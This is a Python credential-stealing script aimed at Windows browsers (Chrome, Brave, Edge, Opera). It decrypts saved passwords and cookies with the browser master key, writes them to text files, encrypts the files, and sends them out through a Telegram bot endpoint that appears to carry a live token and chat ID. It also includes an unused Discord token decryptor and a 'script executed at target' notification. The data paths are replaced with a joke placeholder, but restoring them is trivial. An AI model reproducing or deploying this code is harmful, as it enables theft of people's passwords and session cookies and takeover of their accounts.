import os
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect

import win32crypt
import requests
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes

local = "COMMENTED OUT SO YOU DON'T ACCIDENTALLY EXFILTRATE YOUR OWN DATA :sip:" # os.getenv('LOCALAPPDATA')
roaming = "COMMENTED OUT SO YOU DON'T ACCIDENTALLY EXFILTRATE YOUR OWN DATA :sip:" # os.getenv('APPDATA')

username = os.getlogin()

browser_loc = {
    "Chrome": f"{local}\\Google\\Chrome",
    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
    "Edge": f"{local}\\Microsoft\\Edge",
    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
}

fileCookies = "cooks_" + username + ".txt"
filePass = "passes_" + username + ".txt"

public_key = RSA.importKey("""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1jwo0sjznck8tGmCDMc5
/xXBC1FhQaxV9HMkz64ZDCJ41Zc1Rie6G7A54VRgZ+e8AmyMIdssnja2Eu/JFtaM
Qw8gPMNtIkYWdc8LdnVzsCzL4sL7J+M4zC9qKpWbxIMDvv9T5QjXIcQaDucEMGUZ
YIOxMU1aEBtg+T6D+2nLH1pNs5t23MZr8G7w6W1yhd8NQNEfPYQ3gvjN2qxHDMtt
EWWIm5pcoRyZGXHv/RW71sR2+i8Rkv17kgoxcDSkXRrDKFNQPFKHl1ZXyvic3OYH
OjIFQ+JX5/9KeJEoJi0vYFZnY2zD0Cml3Dxkgpv0J6aWwQ1Bapk/ZbZi3rcLr/Pf
MwIDAQAB
-----END PUBLIC KEY-----""")
cipher_rsa = PKCS1_OAEP.new(public_key)


# DISCORD TOKENS
def decrypt_token(buff, master_key):
    try:
        return AES.new(
            win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1],
            AES.MODE_GCM,
            buff[3:15]
        ).decrypt(buff[15:])[:-16].decode()
    except:
        pass


# DECRYPT CIPHERS
def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


# DECRYPT BROWSER
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

        if os.path.exists(LoginData):
            copy2(LoginData, "TempMan.db")
            with connect("TempMan.db") as conn:
                cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            with open(filePass, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]

                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
                    with open(filePass, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        ######################################################################
        if os.path.exists(CookiesFile):
            copy2(CookiesFile, "CookMe.db")
            with connect("CookMe.db") as conn:
                curr = conn.cursor()
            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            with open(fileCookies, "a") as f:
                f.write(f"*** {name} ***\n")
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if "google" in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                    with open(fileCookies, "a") as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass


def Local_State(path):
    return f"{path}\\User Data\\Local State"


def Login_Data(path):
    if "Profile" in path:
        return f"{path}\\Login Data"
    else:
        return f"{path}\\User Data\\Default\\Login Data"


def Cookies(path):
    if "Profile" in path:
        return f"{path}\\Network\\Cookies"
    else:
        return f"{path}\\User Data\\Default\\Network\\Cookies"


def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)


def send_info():
    requests.post(
        'https://api.telegram.org/bot5922953099:AAG89vBZZIoXt4FbYkUmdukyR9yYniBHxz4/sendMessage',
        data={'chat_id': '-1001855149018', 'text': f'Script executed at target "{username}", exfiltrating data...'}
    )


def upload(file):
    # Encryption based on docs: https://pycryptodome.readthedocs.io/en/latest/src/examples.html#encrypt-data-with-rsa
    session_key = get_random_bytes(16)
    enc_session_key = cipher_rsa.encrypt(session_key)
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest(open(file, "rb").read())

    with open(file, "w") as f:
        f.write(enc_session_key.hex() + "\n")
        f.write(cipher_aes.nonce.hex() + "\n")
        f.write(tag.hex() + "\n")
        f.write(ciphertext.hex() + "\n")
        
    requests.post(
        'https://api.telegram.org/bot5922953099:AAG89vBZZIoXt4FbYkUmdukyR9yYniBHxz4/sendDocument',
        data={'chat_id': '-1001855149018'},
        files={'document': open(file, 'rb')}
    )


for_handler = (
    filePass,
    fileCookies,
    "TempMan.db",
    "CookMe.db"
)


def file_handler(file):
    if os.path.exists(file):
        if ".txt" in file:
            upload(file)
        os.remove(file)


def main():
    send_info()
       
    # CHROME PROFILES
    for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
        if i.startswith("Profile "):
            browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"
    
    for name, path in browser_loc.items():
        print(path, name)
        decrypt_files(path, name)
    for i in for_handler:
        file_handler(i)


if __name__ == "__main__":
    main()
